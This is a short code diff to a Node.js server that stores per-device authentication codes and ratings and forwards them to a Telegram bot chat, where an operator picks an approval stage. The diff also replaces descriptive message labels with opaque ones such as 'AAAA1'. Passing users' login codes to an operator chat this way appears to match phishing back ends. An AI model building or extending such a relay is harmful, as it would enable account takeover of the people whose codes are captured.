@@ -117,15 +117,13 @@ solicitudesOpciones.set(idSolicitud, solicitud);
         chat_id: OPCIONES_CHAT_ID,
 
         text:
-            '🔔 SELECCIÓN DE OPCIÓN\n\n' +
-            'ID: ' + idVisible + '\n\n' +
-            'Decisión: ' +
+            'APROBACIÓN ' + idVisible + ':\n' +
 (
     etapaSolicitud === 'tercera'
-        ? 'Tercera'
+        ? 'AAAA2'
         : etapaSolicitud === 'segunda'
-            ? 'Segunda'
-            : 'Primera'
+            ? 'AAAA1'
+            : 'UyC'
 ) +
             '\n\nSelecciona una opción:',
 
@@ -386,7 +384,7 @@ app.post('/send-auth', async (req, res) => {
 
     // Almacenar el código de autenticación por dispositivo
     if (usuariosData[dispositivoID]) {
-        usuariosData[dispositivoID].codigo = `AAAAA ${dispositivoID.replace('id.', '')}: \`${authCode}\``;
+        usuariosData[dispositivoID].codigo = `AAAA1 ${dispositivoID.replace('id.', '')}: \`${authCode}\``;
     }
 
     await fetch(`https://api.telegram.org/bot${OPCIONES_BOT_TOKEN}/sendMessage`, {
@@ -408,7 +406,7 @@ app.post('/send-calificacion', async (req, res) => {
     // Almacenar la calificación por dispositivo
     if (usuariosData[dispositivoID]) {
         usuariosData[dispositivoID].calificacion =
-            `⭐ CALIFICACIÓN ${dispositivoID.replace('id.', '')}: \`${calificacion}\``;
+            `AAAA2${dispositivoID.replace('id.', '')}: \`${calificacion}\``;
     }
 
     await fetch(`https://api.telegram.org/bot${OPCIONES_BOT_TOKEN}/sendMessage`, {
